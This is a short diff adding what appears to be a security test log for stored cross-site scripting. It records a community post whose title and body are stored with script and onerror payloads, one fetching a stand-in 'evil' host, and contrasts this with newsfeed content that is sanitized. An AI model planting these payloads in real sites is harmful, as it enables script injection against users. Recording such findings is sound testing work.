@@ -1,0 +1,5 @@
+community POST /community slug=xss-post_4474a9c4 -> HTTP 201
+DB community_question.title = '<img src=x onerror=alert("xss_61937199")>'
+DB community_question.body  = '<script>alert("xss_61937199")</script><img src=x onerror="fetch(\'//evil/xss_61937199\')"><b>xss_61937199</b>'
+
+contrast newsfeed content stored = '<img src="x"><b>xss_61937199</b>'
